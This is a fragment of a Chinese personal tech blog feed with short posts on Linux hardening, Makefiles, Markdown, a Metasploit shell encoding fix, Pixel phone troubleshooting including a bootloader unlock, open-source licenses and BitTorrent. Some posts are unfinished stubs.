<h2 id="文件系统安全"><a href="#文件系统安全" class="headerlink" title="文件系统安全"></a>文件系统安全</h2><p>权限越小，系统越安全</p>
<p>设置umask值：<br>编辑/etc/profile文件，修改umask值为027。</p>
<p>设置登录超时：<br>编辑/etc/profile文件，添加<code>TIMEOUT=180</code>，即登录后无操作3分钟将超时断开连接。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Makefile小记</title>
    <url>/2019/04/18/makefile/</url>
    <content><![CDATA[<p>Linux中使用最广的构建工具是<strong>make</strong>，而make会读取<strong>Makefile</strong>文件中的配置信息来完成构建，一个简单的Makefile文件如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">editor : main.o text.o</span><br><span class="line">    gcc -o editor main.o text.o</span><br><span class="line">main.o : main.c def.h</span><br><span class="line">    gcc -c main.c  <span class="comment">#-c参数指定生成.o文件</span></span><br><span class="line">text.o : text.c com.h</span><br><span class="line">    gcc -c text.c</span><br><span class="line">install : editor</span><br><span class="line">    mv editor /usr/<span class="built_in">local</span></span><br></pre></td></tr></table></figure>
<p>具体而言，冒号前面为<strong>target</strong>，即要生成的文件；冒号后面为<strong>dependencies</strong>，即被依赖的文件；每一个<strong>target:dependencies对</strong>的下一行为要执行的<strong>命令</strong>（注意要以Tab键起首）。当make不带参数时，默认执行第一个target。target也可以是要求make要完成的动作，执行这种target后并不能得到和target同名的文件，因此，也称做<strong>phony target</strong>（即伪target），如第7行所示。dependencies也可以为空，如常用的target为<code>clean</code>时，就没有依赖，只有命令，一般用于清理工作。</p>
<p>当输入<code>make</code>或<code>make editor</code>，即可开始构建。若<code>editor</code>这个target文件不存在，或者<code>main.o</code>、<code>text.o</code>这两个依赖文件被修改，都会导致make调用其下的命令<code>gcc -o editor main.o text.o</code>；接下来，由于引用到<code>main.o</code>和<code>text.o</code>，make会检查<code>main.o</code>的依赖<code>main.c</code>、<code>def.h</code>有无更新，如果有，则执行其下的命令<code>gcc -c main.c</code>；同理，也适用于<code>text.o</code>。当输入<code>make install</code>，make会检查install的依赖<code>editor</code>是否是最新，如果是，则执行其下的命令<code>mv editor /usr/local</code>。</p>
<a id="more"></a>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>Makefile中以<code>#</code>开头的均为注释。</p>
<h2 id="回声"><a href="#回声" class="headerlink" title="回声"></a>回声</h2><p>正常情况下，make会打印每条命令，然后再执行，这就叫做<strong>回声</strong>。在命令的前面加上<code>@</code>，就可以关闭回声。由于在构建过程中，需要了解当前在执行哪条命令，所以通常只在注释和纯显示的echo命令前面加上<code>@</code>。</p>
<h2 id="内置目标名"><a href="#内置目标名" class="headerlink" title="内置目标名"></a>内置目标名</h2><p><strong>内置目标名</strong>指示了如果某些名称作为target（目标名）出现，则具有特殊含义，常用的如下所示：</p>
<ul>
<li><code>.PHONY</code>：明确声明伪目标</li>
<li><code>.SUFFIXES</code>：消除默认后缀规则</li>
<li><code>.DELETE_ON_ERROR</code>：如果遇到错误（或make中断）则删除目标文件</li>
</ul>
<p>更多的内置目标名可以参考<a href="https://www.gnu.org/software/make/manual/html_node/Special-Targets.html#Special-Targets">make官方手册</a>。</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>Makefile中也可以使用变量，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TXT = Hello World</span><br><span class="line"><span class="built_in">test</span>:</span><br><span class="line">    <span class="built_in">echo</span> $(TXT)</span><br></pre></td></tr></table></figure>
<p>这类似于C语言中的宏，按照传统，变量名一般大写，使用变量时要放在<code>$()</code>之中。</p>
<p>有时，变量的值可能指向另一个变量，比如：<code>V1 = $(V2)</code>，这时会出现一个问题，V1的值到底在定义时扩展（静态扩展），还是在运行时扩展（动态扩展）？如果V2的值是动态变化的，这两种扩展方式的结果可能会差异很大。为了解决类似问题，Makefile一共提供了四个赋值运算符，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">VARIABLE = value</span><br><span class="line"><span class="comment"># 在运行时扩展，允许递归扩展。</span></span><br><span class="line"></span><br><span class="line">VARIABLE := value</span><br><span class="line"><span class="comment"># 在定义时扩展。</span></span><br><span class="line"></span><br><span class="line">VARIABLE ?= value</span><br><span class="line"><span class="comment"># 只有在该变量为空时才设置值。</span></span><br><span class="line"></span><br><span class="line">VARIABLE += value</span><br><span class="line"><span class="comment"># 将值追加到变量的尾端。</span></span><br></pre></td></tr></table></figure>
<h2 id="内置变量"><a href="#内置变量" class="headerlink" title="内置变量"></a>内置变量</h2><p>Makefile提供了一系列的内置变量，常见的如下所示：</p>
<ul>
<li><code>$(CC)</code>：指向当前使用的编译器</li>
</ul>
<p>更多的内置变量可以参考<a href="https://www.gnu.org/software/make/manual/html_node/Implicit-Variables.html">make官方手册</a>。</p>
<h2 id="自动变量"><a href="#自动变量" class="headerlink" title="自动变量"></a>自动变量</h2><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><p>使用条件判断，可以让make根据运行时的不同情况选择不同的执行分支。如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifeq ($(CC),gcc)</span><br><span class="line">  libs=$(libs_for_gcc)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  libs=$(normal_libs)</span><br><span class="line">endif</span><br></pre></td></tr></table></figure>
<p>上面代码判断当前编译器是否为gcc，然后指定不同的库文件。其中<code>ifeq</code>比较参数<code>arg1</code>和<code>arg2</code>是否相同，类似的，<code>ifneq</code>比较参数<code>arg1</code>和<code>arg2</code>是否不相同。</p>
<p>除此之外，还有<code>ifdef</code>判断变量是否被定义，<code>ifndef</code>判断变量是否没有被定义。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>Makefile中还内置了许多函数，可供调用，格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$(<span class="keyword">function</span> arguments)</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="variable">$&#123;function arguments&#125;</span></span><br></pre></td></tr></table></figure>
<p>常用的函数有：</p>
<ul>
<li><code>$(shell)</code>：用来执行shell命令</li>
<li><code>$(wildcard)</code>：用来在Makefile中，替换Bash的通配符。</li>
<li><code>$(patsubst)</code>：用于模式匹配的替换，语法为<code>$(patsubst &lt;pattern&gt;,&lt;replacement&gt;,&lt;text&gt;)</code></li>
<li><code>$(filter)</code>：</li>
<li><code>$(addsuffix)</code>：</li>
<li><code>$(addprefix)</code>：</li>
<li><code>$(if)</code>：</li>
<li><code>$(foreach)</code>：</li>
<li><code>$(call)</code>：唯一一个可以用来创建新的参数化的函数，语法为<code>$(call &lt;expression&gt;,&lt;parm1&gt;,&lt;parm2&gt;,...,&lt;parmn&gt;)</code>，值得注意的是，call函数在处理参数时，第2个及其之后的参数中的空格会被保留，因而在向call函数提供参数时，最安全的做法是去除所有多余的空格，避免造成一些奇怪的效果。</li>
</ul>
<p>相关示例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># shell函数用法</span></span><br><span class="line">contents := $(shell cat foo) <span class="comment"># 将foo文件中的内容赋值给contents</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># call函数用法</span></span><br><span class="line">reverse =  $(2) $(1)</span><br><span class="line">foo = $(call reverse,a,b) <span class="comment"># 最终foo的值为b a</span></span><br></pre></td></tr></table></figure>

<p>更多的内置函数可以参考<a href="https://www.gnu.org/software/make/manual/html_node/Functions.html">make官方手册</a></p>
<h2 id="引用其它的Makefile"><a href="#引用其它的Makefile" class="headerlink" title="引用其它的Makefile"></a>引用其它的Makefile</h2><p>在Makefile中可以使用<code>include</code>关键字把别的Makefile包含进来，这很像C语言的<code>#include</code>，被包含的文件会原模原样的放在当前文件的包含位置。<code>include</code>的语法是：<code>include &lt;filename&gt;</code>，其中被包含的Makefile文件通常以<code>.mk</code>结尾。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown小记</title>
    <url>/2018/07/21/markdown-cheatsheet/</url>
    <content><![CDATA[<p>Markdown是一种轻量标记语言，其文件后缀名为<code>.md</code>，它允许人们采用其规定的语法编写文档，而后Markdown解析器会将其转化为有效的HTML文档，以便在网页中显示，时至今日，有许多Markdown解析器增强了Markdown的基本语法，这就造成了Markdown有多种<strong>风格</strong>（flavor）。因为Markdown要被转化为HTML才能在网页上显示，所以在Markdown中仍然可以使用HTML，如果有Markdown无法完成的工作，完全可以再用回HTML。</p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">#### 四级标题</span><br></pre></td></tr></table></figure>
<p>对应HTML，最高6级标题。</p>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 无序列表项</span><br><span class="line">    - 这是是嵌套列表项</span><br><span class="line">    - 这里也是嵌套列表项</span><br><span class="line">- 无序列表项</span><br><span class="line">- 无序列表项</span><br><span class="line"></span><br><span class="line">1. 有序列表项</span><br><span class="line">2. 有序列表项</span><br><span class="line">3. 有序列表项</span><br></pre></td></tr></table></figure>
<p>无序列表项常以<code>-</code>或<code>*</code>起始，个人习惯使用<code>-</code>。</p>
<a id="more"></a>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Howie&#39;s Blog](http:&#x2F;&#x2F;howiezhao.com)</span><br></pre></td></tr></table></figure>
<p>超文本链接必须带http。</p>
<h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![一张图片](&#x2F;images&#x2F;abc.jpg)</span><br></pre></td></tr></table></figure>
<p>当图片无法显示时，则显示中括号中的语句。<br>图片的路径为相对路径，即当前Markdown文件所在路径下的<code>images</code>中的<code>abc.jpg</code>。</p>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*斜体*</span><br><span class="line">**粗体**</span><br><span class="line">***粗斜体***</span><br></pre></td></tr></table></figure>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>```<br>这里是多行代码<br>```</p>
<p>`这里是单行代码`</p>
<h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表头1 | 表头2</span><br><span class="line">--- | ---</span><br><span class="line">单元格1 | 单元格2</span><br><span class="line">单元格3 | 单元格4</span><br></pre></td></tr></table></figure>
<p>上下应该各空一行</p>
<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; 这是引用</span><br></pre></td></tr></table></figure>
<h3 id="横线"><a href="#横线" class="headerlink" title="横线"></a>横线</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----</span><br></pre></td></tr></table></figure>
<p>这是一条水平区分线，用3个或以上的短横线表示，个人习惯使用4个短横线。</p>
<h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>和传统编程语言一样，Markdown使用<code>\</code>转义以上特殊字符。</p>
<h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><ol>
<li>在特殊字符与要书写的文字之间加上空格</li>
<li>不同段之间加一空行</li>
<li>链接后加一个空格</li>
</ol>
<h2 id="GitHub-Flavored-Markdown"><a href="#GitHub-Flavored-Markdown" class="headerlink" title="GitHub Flavored Markdown"></a>GitHub Flavored Markdown</h2><p>GitHub Flavored Markdown，简记为<strong>GFM</strong>，即<strong>GitHub风格的Markdown语法</strong>，是GitHub中编辑器使用的Markdown语法格式，略微区别于标准的Markdown语法，主要如下：</p>
<ol>
<li>链接自动识别：GFM会自动为标准的URL加上链接</li>
<li>语法着色：在<code>```</code>后输入语言名称，即可着色，要查看支持的语言列表，请参考<a href="https://github.com/github/linguist/blob/master/lib/linguist/languages.yml">官方文档</a></li>
<li>删除线：使用<code>~~</code>表示删除线</li>
<li>任务列表：使用<code>- [ ]</code>或<code>- [x]</code>表示未勾选或已勾选的任务列表</li>
<li>Emoji：使用<code>:EMOJICODE:</code>可以显示Emoji表情，比如<code>:+1:</code>表示一个👍，要查看完整的Emoji编码，可参考<a href="https://www.webpagefx.com/tools/emoji-cheat-sheet/">Emoji cheat sheet</a></li>
</ol>
<p>要了解GFM的更多特性，可以参考<a href="https://help.github.com/categories/writing-on-github/">GitHub官方的文档</a>。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p><a href="https://dillinger.io/">Dillinger</a>是一个在线的Markdown编辑器。<br>Sublime Text拥有众多的Markdown插件，其中<a href="https://packagecontrol.io/packages/MarkdownPreview">Markdown​Preview</a>可以在浏览器中预览Markdown文件，而<a href="https://packagecontrol.io/packages/MarkdownEditing">Markdown​Editing</a>可以快速的编辑Markdown文件。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>形而上与形而下</title>
    <url>/2018/05/01/metaphysics-physics/</url>
    <content><![CDATA[<p>形而上者谓之道，形而下者谓之器。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Metasploit 中 shell 中文乱码解决方案</title>
    <url>/2017/12/04/metasploit-luanma/</url>
    <content><![CDATA[<p>有时在 Kali Linux 中获得了一个 Windows shell 或者在 meterpreter 中进入 shell 后，执行命令可能会出现中文乱码，其原因是 Windows 和 Linux 的编码不同，导致 Windows 中的中文在 Linux 中无法正常显示。</p>
<p><strong>解决方法：</strong></p>
<ol>
<li>在 shell 窗口的工具栏选择“编辑”——&gt;“首选项”——&gt;“编码”，选中简体中文的三个编码：GB18030，GB2312，GBK，打勾并退出</li>
<li>接着在“终端”——&gt;“设定字符编码”中选择添加的三个简体中文编码之一即可</li>
</ol>
<p><strong>注意：</strong></p>
<ol>
<li>这个设置会随着操作系统的重启而失效</li>
<li>设定简体中文编码之后，Linux 中的中文字符就会乱码，因为 Linux 使用 UTF-8 编码</li>
<li>建议只在需要的时候设定简体中文编码</li>
</ol>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>微软平台技术简介</title>
    <url>/2018/09/22/microsoft-technology/</url>
    <content><![CDATA[<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>微软最初的操作系统的DOS，DOS只是一个命令行形式，后来</p>
<h2 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h2><h2 id="Windows-Phone"><a href="#Windows-Phone" class="headerlink" title="Windows Phone"></a>Windows Phone</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Nexus/Pixel 相关问题解决</title>
    <url>/2019/07/21/nexus-pixel-problem/</url>
    <content><![CDATA[<h2 id="移动网络-WiFi-出现叹号或叉号"><a href="#移动网络-WiFi-出现叹号或叉号" class="headerlink" title="移动网络/WiFi 出现叹号或叉号"></a>移动网络/WiFi 出现叹号或叉号</h2><p>Captive Portal 是从 Android 5 开始引入的一项新功能，其主要用于检测网络连接是否正常，当用户连接网络后，系统会通过 HTTP 访问一个 Google 的服务器，若返回 200 状态码，则表示用户可能处在一个需要登录认证的网络环境中；若返回 204 状态码，则表示网络连接正常；若连接超时，则表示网络连接不正常，此时网络图标会显示一个叹号或叉号。</p>
<p>显然，Google 的服务器是连接不上的，我们可以通过修改服务器地址来解决此问题。具体而言，连接 ADB，针对不同的系统版本，下方分别给出了相关命令：</p>
<p>Android 9.0/8.1/8.0/7.1.2/7.1.1：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings put global captive_portal_https_url https://www.google.cn/generate_204</span><br></pre></td></tr></table></figure>

<p>Android 7.1/7.0：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings delete global captive_portal_server  </span><br><span class="line">adb shell settings put global captive_portal_detection_enabled 0</span><br></pre></td></tr></table></figure>

<p>Android 5.0-6.x：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell settings put global captive_portal_server www.google.cn</span><br></pre></td></tr></table></figure>

<p>执行之后，开启飞行模式，接着关闭飞行模式即可。</p>
<a id="more"></a>
<h2 id="搜索不到-WiFi"><a href="#搜索不到-WiFi" class="headerlink" title="搜索不到 WiFi"></a>搜索不到 WiFi</h2><p>因为美国 2.4GHz 频段的 WiFi 信道为 1-11，而中国 2.4GHz 频段的 WiFi 信道为 1-13，所以当 2.4GHz 频段的 WiFi 信道位于 12 或 13 时，美版的 Nexus/Pixel 会搜索不到 WiFi，此时可通过重启路由器，使其自动更换信道，或进入路由器设置页面，将信道改为 11 以内任意信道即可。</p>
<h2 id="4G-信号问题"><a href="#4G-信号问题" class="headerlink" title="4G 信号问题"></a>4G 信号问题</h2><p>由于联通的网络制式一直采用的是国际通用的网络制式，所以 Nexus/Pixel 可以完美支持联通 2G/3G/4G。</p>
<p>移动的 3G 网络制式采用的是自主研发的技术，所以 Nexus/Pixel 并不支持移动 3G，然而移动 4G 网络制式采用的是自主研发和国际通用并行的方式，所以 Nexus/Pixel 只支持部分移动 4G 频段。</p>
<p>简单来说，Nexus/Pixel 完美支持联通 2G/3G/4G，支持移动 2G，不支持移动 3G，部分支持移动 4G（具体表现为在城市有 4G 网络，在农村没有 4G 网络），电信 2G/3G/4G 可通过破解（本文不讨论这点）实现支持。</p>
<h2 id="Google（即负一屏）无法使用"><a href="#Google（即负一屏）无法使用" class="headerlink" title="Google（即负一屏）无法使用"></a>Google（即负一屏）无法使用</h2><h2 id="接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）"><a href="#接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）" class="headerlink" title="接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）"></a>接听电话时黑屏，且无法点亮屏幕以挂断电话（插耳机时一切正常）</h2><p>严格来说，这不算是 Nexus/Pixel 特有的问题，究其原因是距离感应器坏了，可通过设置使用电源键挂断电话，具体方法为在<strong>设置</strong> —&gt; <strong>辅助功能/无障碍</strong>中开启<strong>按电源按钮结束通话</strong>。</p>
<h2 id="蓝牙传输失败，显示不支持此内容"><a href="#蓝牙传输失败，显示不支持此内容" class="headerlink" title="蓝牙传输失败，显示不支持此内容"></a>蓝牙传输失败，显示不支持此内容</h2><p>由于版权问题，原生 Android 不支持传输以 <code>.apk</code> 结尾的文件，可通过将其改为 <code>.jpg</code> 结尾传输。</p>
<h2 id="Google-Play-商店更新应用卡住"><a href="#Google-Play-商店更新应用卡住" class="headerlink" title="Google Play 商店更新应用卡住"></a>Google Play 商店更新应用卡住</h2><p>在 Android 9.0 之前，Play 商店是通过<strong>下载管理器</strong>下载应用的，出现这种情况可以直接将<strong>下载管理器</strong>强行停止，然后重新启动 Play 商店即可更新应用。在 Android 9.0 之后，可直接将 Play 商店强行停止再重新启动即可。</p>
<h2 id="系统无法更新"><a href="#系统无法更新" class="headerlink" title="系统无法更新"></a>系统无法更新</h2><p>具体表现为<strong>系统更新</strong>处永远显示<strong>正在安装系统更新</strong>，一般来说，这是由于网络原因引起的，目前并没有一个稳定的解决办法，建议直接下载新系统镜像并线刷。你可以在<a href="https://developers.google.cn/android/images">这个官方地址</a>找到有关 Nexus/Pixel 的所有出厂镜像，其中也附带有详细的安装方法。</p>
<p>具体而言，你需要先解锁 Bootloader，然后连接 ADB，紧接着执行 <code>adb reboot bootloader</code> 进入 fastboot 模式，最后执行相应系统的 <code>flash-all</code> 脚本即可。</p>
<h2 id="Pixel-Pixel-XL-Verizon-版解锁-Bootloader-教程"><a href="#Pixel-Pixel-XL-Verizon-版解锁-Bootloader-教程" class="headerlink" title="Pixel/Pixel XL Verizon 版解锁 Bootloader 教程"></a>Pixel/Pixel XL Verizon 版解锁 Bootloader 教程</h2><p>教程来源自 xda 上的一篇<a href="https://www.xda-developers.com/unlock-bootloader-verizon-google-pixel-xl/">文章</a>，具体步骤如下：</p>
<ol>
<li>从您的设备中删除 Google 帐户和任何类型的屏幕锁定（指纹，PIN，图案等）。</li>
<li>从您的设备中取出 SIM 卡。</li>
<li>重置您的设备。在设置向导中，跳过所有内容，不要连接到 WiFi，不要添加指纹或任何类型的屏幕锁定。</li>
<li>转到开发人员选项并启用 USB 调试。</li>
<li>将手机连接到 PC。</li>
<li>在 adb 目录中打开 CMD 并输入：<code>adb shell pm uninstall --user 0 com.android.phone</code></li>
<li>重启您的设备。</li>
<li>连接到 WiFi，打开 Chrome 并转到 google.com（或任何网站）。</li>
<li>转到开发人员选项并启用 OEM 解锁。</li>
<li>重启到 bootloader 并通过 CMD 运行：<code>fastboot oem unlock</code> 或 <code>fastboot flashing unlock</code>。</li>
<li>完成。</li>
</ol>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>开源协议漫谈</title>
    <url>/2018/11/02/open-sourse-license/</url>
    <content><![CDATA[<p><strong>开源协议</strong>（Open Source License）往往又被称为<strong>开源许可证</strong>，世界上的开源协议大约有上百种，但最常见的也无非6种而已，即GPL、LGPL、Mozilla、Apache、BSD和MIT，下文将逐个介绍，此外，本文还介绍了CC BY-NC-SA协议。</p>
<a id="more"></a>
<h2 id="GPL"><a href="#GPL" class="headerlink" title="GPL"></a>GPL</h2><p><a href="https://www.gnu.org/licenses/gpl.html">GPL</a>全称GNU General Public License，即<strong>GNU通用公共许可协议</strong>，这是由GNU开源组织发起的，目前最新版是3.0。</p>
<h2 id="LGPL"><a href="#LGPL" class="headerlink" title="LGPL"></a>LGPL</h2><p><a href="https://www.gnu.org/licenses/lgpl-3.0.en.html">LGPL</a>全称GNU Lesser General Public License，即<strong>GNU宽通用公共许可证</strong>，这也是由GNU开源组织发起的，目前最新版是3.0。</p>
<h2 id="Mozilla"><a href="#Mozilla" class="headerlink" title="Mozilla"></a>Mozilla</h2><p><a href="https://www.mozilla.org/en-US/MPL/">Mozilla Public License</a>简称MPL，这是由Mozilla开源组织发起的，目前最新版是2.0。</p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p><a href="https://www.apache.org/licenses/">Apache License</a>是由Apache开源组织发起的，目前最新版是2.0。</p>
<h2 id="BSD"><a href="#BSD" class="headerlink" title="BSD"></a>BSD</h2><p>BSD License是由加州大学伯克利分校发起的，</p>
<h2 id="MIT"><a href="#MIT" class="headerlink" title="MIT"></a>MIT</h2><p>MIT License是由麻省理工学院发起的</p>
<h2 id="CC-BY-NC-SA"><a href="#CC-BY-NC-SA" class="headerlink" title="CC BY-NC-SA"></a>CC BY-NC-SA</h2><p><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>全称Creative Commons-Attribution-Noncommercial-ShareAlike，即<strong>创作共享-署名-非商业性-相同方式共享</strong>，这是由<strong>创作共享</strong>组织发起的，目前最新版是4.0。</p>
<h2 id="作何选择？"><a href="#作何选择？" class="headerlink" title="作何选择？"></a>作何选择？</h2><p>如何简单快速的选择自己所需的开源协议呢？乌克兰程序员Paul Bagwell制作了一张分析图，国内程序员阮一峰根据此图制作出了中文版，图片如下（摘选自阮一峰博客<a href="http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html">如何选择开源许可证？</a>）：<img src="/images/license.png" alt="license">此外，<a href="https://choosealicense.com/">https://choosealicense.com/</a> 是一个不错的网站，它使你通过回答一些问题来选择合适的开源协议。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>P2P 与 BitTorrent</title>
    <url>/2020/12/15/p2p-bittorrent/</url>
    <content><![CDATA[<p>P2P 是一种<strong>体系结构</strong>，就好像 C/S 体系结构一样，但不同的是，P2P 对总是打开的基础设施服务器有最小的（或者没有）依赖，成对间歇连接的主机（称为<strong>对等方</strong>）彼此直接通信。</p>
<p>基于 P2P 这种体系结构产生了许多应用，譬如<strong>文件分发应用</strong>和<strong>分布式散列表</strong>（DHT），而文件分发应用中一个典型的例子就是 BitTorrent 协议。</p>
<p>如果要类比 P2P 与 BitTorrent 之间的关系，就好像 C/S 体系结构与 FTP 协议之间的关系。</p>
<a id="more"></a>

<h2 id="P2P-与-C-S"><a href="#P2P-与-C-S" class="headerlink" title="P2P 与 C/S"></a>P2P 与 C/S</h2><p>以文件分发应用为例，在 C/S 文件分发中，该服务器必须向每个对等方发送该文件的一个副本，即服务器承受了极大的负担，并且消耗了大量的服务器带宽。在 P2P 文件分发中，每个对等方能够向任何其他对等方重新分发它已经收到的该文件的任何部分，从而在分发过程中协助该服务器。</p>
<p>对于 C/S 体系结构，随着对等方数量的增加，分发时间呈线性增长并且没有界。然而，对于 P2P 体系结构，最小分发时间不仅总是小于 C/S 体系结构的分发时间，并且对于任意的对等方数量，总是小于一对一的 C/S 体系结构的分发时间。因此，具有 P2P 体系结构的应用程序能够是自扩展的。这种扩展性的直接成因是：<strong>对等方除了是比特的消费者外还是它们的重新分发者</strong>。</p>
<h2 id="BitTorrent"><a href="#BitTorrent" class="headerlink" title="BitTorrent"></a>BitTorrent</h2><p>如前所述，BitTorrent 是最为流行的 P2P 文件分发协议，通常也简称为 BT，最初由 Bram Cohen 所研发。</p>
<p>用 BitTorrent 的术语来讲，参与一个特定文件分发的所有对等方的集合被称为一个<strong>洪流（torrent）</strong>。在一个洪流中的对等方彼此下载等长度的文件块（chunk），典型的块长度为 256 KB。当一个对等方首次加入一个洪流时，它没有块。随着时间的流逝，它累积了越来越多的块。当它下载块时，也为其他对等方上载了多个块。一旦某对等方获得了整个文件，它也许（自私地）离开洪流，或（大公无私地）留在该洪流中并继续向其他对等方上载块。同时，任何对等方可能在任何时候仅具有块的子集就离开该洪流，并在以后重新加入该洪流中。</p>
<p>每个洪流具有一个基础设施节点，称为 <strong>tracker</strong>（追踪器）。当一个对等方加入某洪流时，它向 tracker 注册自己，并周期性地通知 tracker 它仍在该洪流中。以这种方式，tracker 跟踪参与在洪流中的对等方。</p>
<p>当一个新的对等方 A 加入该洪流时，tracker 随机地从参与对等方的集合中选择对等方的一个子集，将这个子集中每个对等方的 IP 地址发送给 A。A 持有对等方的这张列表，试图与该列表上的所有对等方创建并行的 TCP 连接。我们称所有这样与 A 成功地创建一个 TCP 连接的对等方为<strong>邻近对等方</strong>。一个对等方的临近对等方将随时间而波动。</p>
<p>在任何给定的时刻，A 将具有块的子集并知道它的邻居具有哪些块。利用这些信息，A 将做出两个重要决定：</p>
<ul>
<li>它应当从它的邻居请求哪些块呢？</li>
<li>它应当向哪些向它请求块的邻居发送块？</li>
</ul>
<p>在决定请求哪些块的过程中，A 使用一种称为<strong>最稀缺优先</strong>（rarest first）的技术。这种技术的思路时，针对它没有的块在它的邻居中决定最稀缺的块（最稀缺的块就是那些在它的邻居中副本数量最少的块），并首先请求那些最稀缺的块。这样，最稀缺块得到更为迅速的重新发放，其目标是（大致地）均衡每个块在洪流中的副本数量。</p>
<p>为了决定它响应哪个请求，BitTorrent 使用了一种被称为<strong>一报还一报</strong>（tit-for-tat）的交换激励机制。其基本想法是，A 根据当前能够以 <em>最高速率</em> 向它提供数据的邻居，给出其优先权。特别是，A 对于它的每个邻居都持续地测量接收到比特的速率，并确定以最高速率流入的 4 个邻居。每过 10 秒，它重新计算该速率并可能修改这 4 个对等方的集合。用 BitTorrent 术语来说，这 4 个对等方被称为<strong>疏通</strong>（unchoked）。重要的是，每过 30 秒，它也要随机地选择另外一个邻居并向其发送块。我们将这个被随机选择的对等方称为 B。现在站在 B 的角度上看，因为 A 正在向 B 发送数据，它可能成为 B 前 4 位上载者之一，这样的话 B 将开始向 A 发送数据。如果 B 向 A 发送数据的速率足够高，B 接下来也能成为 A 的前 4 位上载者。换言之，每过 30 秒 A 将随机地选择一名新的对换伴侣并开始与那位伴侣进行对换。如果这两名对等方都满足此对换，它们将对方放入其前 4 位列表中并继续与对方进行对换，直到该对等方之一发现了一个更好的伴侣为止。这种效果是对等方能够以趋向于找到彼此的协调的速率上载。随机选择邻居也允许新的对等方得到块，因此它们能够具有对换的东西。除了这 5 个对等方（<em>前</em> 4 个对等方和一个试探的对等方）的所有其他相邻对等方均被 <em>阻塞</em>，即它们不能从 A 接收到任何块。</p>
<h2 id="BitTorrent-客户端"><a href="#BitTorrent-客户端" class="headerlink" title="BitTorrent 客户端"></a>BitTorrent 客户端</h2><p>就如同 FTP 协议有众多的 FTP 客户端一样，BitTorrent 协议也有众多的 BitTorrent 客户端。最早的 BitTorrent 客户端应该是由 BitTorrent 发明人 Bram Cohen 开发的，很巧，软件的名字也叫 <a href="https://www.bittorrent.com/zh-cn/">BitTorrent</a>，现在已经成长为一家公司，也收购了著名的开源 BitTorrent 客户端 <a href="https://www.utorrent.com/intl/zh_cn/">µTorrent</a>。</p>
<p>出于种种原因，现在并不推荐使用以上两款软件，BitTorrent 发明人 Bram Cohen 也已经离开了那家公司，更推荐使用开源跨平台的 <a href="https://www.qbittorrent.org/">qBittorrent</a>。</p>
<!--迅雷-->

